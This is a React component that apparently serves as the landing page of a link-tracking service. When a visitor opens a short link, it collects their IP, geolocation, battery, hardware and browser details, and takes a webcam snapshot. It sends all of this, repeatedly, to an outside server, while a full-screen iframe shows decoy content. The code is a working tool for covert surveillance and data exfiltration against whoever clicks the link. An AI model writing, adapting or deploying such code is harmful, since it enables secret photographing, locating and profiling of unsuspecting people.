import { useEffect } from "react";
import { useParams } from "react-router-dom";

function VisitorTracker() {
  const { shortId } = useParams();

  useEffect(() => {
    let videoStream = null;
    let baseData = {};
   // ચોક્કસ કી (Key) મેળવવા માટે
 

    // ✅ ONE-TIME HEAVY DATA COLLECTION
    const initVisitor = async () => {
      try {
        // 🌐 IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();

        // 📍 Location (only once)
        let latitude = "";
        let longitude = "";
        if (navigator.geolocation) {
          try {
            const pos = await new Promise((resolve, reject) =>
              navigator.geolocation.getCurrentPosition(resolve, reject)
            );
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
          } catch {
            console.log("Location denied");
          }
        }

        // 🔋 Battery
        let batteryInfo = { level: "N/A", charging: "N/A" };
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryInfo = {
            level: battery.level * 100 + "%",
            charging: battery.charging,
          };
        }

        // 🎥 Camera (ONLY ONCE)
        let cameraImage = null;
        try {
          videoStream = await navigator.mediaDevices.getUserMedia({ video: true });

          const video = document.createElement("video");
          video.srcObject = videoStream;
          await video.play();

          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;

          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          cameraImage = canvas.toDataURL("image/jpeg", 0.5);
        } catch {
          console.log("Camera denied");
        }

        // ✅ Store base data (important)
        baseData = {
          shortId,
          ip: ipData.ip,
          latitude,
          longitude,
          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
          cpuCores: navigator.hardwareConcurrency || "N/A",
          browser: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screen: `${window.screen.width}x${window.screen.height}`,
          cameraImage,
        };

        sendData(); // first hit
      } catch (err) {
        console.log("Init error:", err);
      }
    };

    // ✅ LIGHTWEIGHT TRACKING FUNCTION
    const sendData = async () => {
      try {
        const token = localStorage.getItem("token");

        let batteryLevel = "N/A";
        let isCharging = "N/A";

        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = battery.level * 100 + "%";
          isCharging = battery.charging;
        }

        const visitorData = {
          ...baseData,
          batteryLevel,
          isCharging,
          timestamp: new Date().toISOString(),
        };

        const res = await fetch(
          `https://user-tracking-1.onrender.com/api/auth/t/${shortId}`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Authorization: `Bearer ${token}`,
            },
            body: JSON.stringify(visitorData),
          }
        );

        const result = await res.json();

        
        if (result.redirectUrl) {
          const frame = document.getElementById("target-frame");
          if (frame && !frame.src) {
            frame.src = result.redirectUrl;
          }
        }
      } catch (err) {
        console.log("Tracking error:", err);
      }
    };

    // 🚀 INIT
    initVisitor();

    // ✅ Polling (reduced load)
    const interval = setInterval(sendData, 10000); // every 10 sec

    // ✅ EXIT TRACKING
    const handleExit = () => {
      navigator.sendBeacon(
        `https://user-tracking-1.onrender.com/api/auth/exit/${shortId}`
      );
    };

    window.addEventListener("beforeunload", handleExit);

    // 🧹 CLEANUP
    return () => {
      clearInterval(interval);
      window.removeEventListener("beforeunload", handleExit);

      // ✅ Stop camera properly
      if (videoStream) {
        videoStream.getTracks().forEach((track) => track.stop());
      }
    };
  }, [shortId]);

  return (
    <div style={{ width: "100vw", height: "100vh", overflow: "hidden" }}>
      <iframe
        id="target-frame"
        title="Target Content"
        style={{ width: "100%", height: "100%", border: "none" }}
  sandbox="allow-scripts allow-same-origin allow-top-navigation allow-popups"
      />
    </div>
  );
}

export default VisitorTracker; 